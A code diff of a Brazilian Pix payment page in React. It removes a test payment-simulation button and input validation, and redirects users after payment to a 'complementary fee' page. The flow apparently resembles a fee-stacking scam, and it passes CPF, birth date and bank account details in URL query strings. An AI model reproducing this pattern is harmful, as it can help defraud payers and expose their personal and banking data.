@@ -168,10 +168,7 @@ export default function PagamentoPix() {
     setTimeout(() => setCopied(false), 3000);
   };
   
-  // Simular o pagamento (para fins de demonstração)
-  const simularPagamento = () => {
-    navigate("/sucesso");
-  };
+  // Removida a função de simulação de pagamento conforme solicitado pelo cliente
   
   // Formatar o tempo do contador (mm:ss)
   const formatarTempo = (segundos: number) => {
@@ -192,11 +189,8 @@ export default function PagamentoPix() {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          nome: nome,
-          cpf: cpf,
-          email: email,
-          telefone: telefone,
-          valor: 74.90
+          name: nome,
+          cpf: cpf
         })
       });
 
@@ -282,9 +276,10 @@ export default function PagamentoPix() {
             telefone: telefone
           });
           
-          // Redirecionar para a página de sucesso
+          // TEMPORÁRIO: Redirecionar para a página de taxa complementar
+          // Depois de pronto, voltaremos a usar /sucesso?${params.toString()}
           setTimeout(() => {
-            navigate(`/sucesso?${params.toString()}`);
+            navigate(`/taxa-complementar?${params.toString()}`);
           }, 1500);
         }
       }
@@ -297,23 +292,6 @@ export default function PagamentoPix() {
 
   // Efeito para criar o pagamento quando a página carregar
   useEffect(() => {
-    // Verificar se temos todos os dados necessários antes de criar o pagamento
-    if (!cpf || !nome || !email || !telefone) {
-      console.error("[PagamentoPix] Dados essenciais faltando:", { cpf, nome, email, telefone });
-      toast({
-        title: "Erro ao processar pagamento",
-        description: "Dados incompletos para gerar pagamento. Volte e preencha todos os campos.",
-        variant: "destructive"
-      });
-      
-      // Redirecionar para a página inicial após 3 segundos
-      setTimeout(() => {
-        navigate("/");
-      }, 3000);
-      return;
-    }
-    
-    console.log("[PagamentoPix] Criando pagamento com dados:", { cpf, nome, email, telefone });
     criarPagamento();
   }, []);
 
@@ -529,58 +507,6 @@ export default function PagamentoPix() {
                     </div>
                   </div>
                   <p className="text-xs text-green-800 mt-2 pl-11">Valor total a ser depositado</p>
-                </div>
-                
-                {/* Botão de simulação - APENAS PARA TESTES */}
-                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-lg shadow-sm p-4 border border-purple-200">
-                  <div className="flex items-center mb-2">
-                    <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
-                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
-                      </svg>
-                    </div>
-                    <div>
-                      <p className="text-xs font-medium text-purple-800 uppercase tracking-wide">Simulação de Pagamento</p>
-                      <Button
-                        onClick={() => {
-                          if (!paymentInfo?.id) return;
-                          
-                          setPaymentStatus("completed");
-                          toast({
-                            title: "Pagamento simulado!",
-                            description: "Simulando confirmação de pagamento. Redirecionando...",
-                            variant: "default"
-                          });
-                          
-                          // Preparar parâmetros para o redirecionamento
-                          const params = new URLSearchParams({
-                            cpf: cpf,
-                            nome: nome,
-                            valor: valor.toString(),
-                            pagamentoId: paymentInfo.id,
-                            dataPagamento: new Date().toISOString(),
-                            companhia: companhia,
-                            estado: estado,
-                            nasc: dataNascimento,
-                            agencia: urlParams.get('agencia') || "",
-                            conta: urlParams.get('conta') || "",
-                            email: email,
-                            telefone: telefone
-                          });
-                          
-                          // Redirecionar para a página de taxa complementar após simulação
-                          setTimeout(() => {
-                            console.log("[SIMULAÇÃO] Redirecionando para a página de taxa complementar");
-                            navigate(`/taxa-complementar?${params.toString()}`);
-                          }, 1500);
-                        }}
-                        className="bg-purple-600 hover:bg-purple-700 text-white w-full mt-2"
-                      >
-                        SIMULAR CONFIRMAÇÃO DE PAGAMENTO
-                      </Button>
-                    </div>
-                  </div>
-                  <p className="text-xs text-purple-800 mt-2 pl-11">Clique para simular um pagamento bem-sucedido e ver o redirecionamento</p>
                 </div>
                 
                 <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
@@ -860,6 +786,9 @@ export default function PagamentoPix() {
                     </div>
                   )}
                 </Button>
+
+                {/* BOTÃO TEMPORÁRIO PARA TESTES - Será removido após finalizar o desenvolvimento */}
+                {/* Botão de simulação removido conforme solicitado pelo cliente */}
                 
                 <div className="bg-red-600 p-4 rounded-lg text-white shadow-sm">
                   <div className="flex items-center mb-2">
